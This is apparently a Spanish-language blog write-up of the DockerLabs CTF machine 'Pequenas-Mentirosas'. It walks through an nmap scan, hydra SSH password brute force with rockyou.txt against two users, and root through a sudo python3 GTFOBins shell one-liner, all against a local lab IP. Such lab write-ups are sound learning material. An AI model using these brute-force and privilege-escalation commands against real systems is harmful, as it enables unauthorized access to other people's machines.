---
title: Pequenas-Mentirosas
author: Ldeluq
date: 2025-01-13 14:10:00 +0800
categories:
  - Ctf
  - DockerLabs
tags:
  - ciber
render_with_liquid:
---
Iniciamos la Maquina

![[Pasted image 20250113213734.png]](/imagenes/Pasted%20image%2020250113213734.png)

escaneamos los puertos `nmap -p- --open -sCSV -vvv -Pn -n --min-rate 5000 172.17.0.2`

![[Pasted image 20250113213859.png]](/imagenes/Pasted%20image%2020250113213859.png)

entramos al navegador 

![[Pasted image 20250113214035.png]](/imagenes/Pasted%20image%2020250113214035.png)

analizando la pista nos da un indicio que a es un usuario  use goubuster en busca de directorios pero la busqueda no arrojo nada interesante 

![[Pasted image 20250113214315.png]](/imagenes/Pasted%20image%2020250113214315.png)

procedo a realizar fuerza bruta con hydra al ssh con a como ususario  `hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2` y encontramos la contrasena secret 

![[Pasted image 20250113214619.png]](/imagenes/Pasted%20image%2020250113214619.png)

entramos por ssh con las credenciales encontradas `ssh a@172.17.0.2` y listamos los servicios con `sudo -l` no podemos con este usuario pero al navegar en los directorios encontramos que existe otro ususario spencer

![[Pasted image 20250113215032.png]](/imagenes/Pasted%20image%2020250113215032.png)

hacemos fuerza bruta con hydra con el nuevo usuario spencer `hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2` y encontramos la contrasena password1

![[Pasted image 20250113215255.png]](/imagenes/Pasted%20image%2020250113215255.png)

nos hacemos usuario spencer y listamos los servicios con `sudo -l` 

![[Pasted image 20250113215510.png]](/imagenes/Pasted%20image%2020250113215510.png)

buscamos en gtfobins como escalar privilegios en python3 

![[Pasted image 20250113215954.png]](/imagenes/Pasted%20image%2020250113215964.png)

ejecutamos `sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'` y nos hacemos root verificamos con `whoami` 


![[Pasted image 20250113220214.png]](/imagenes/Pasted%20image%2020250113220214.png)






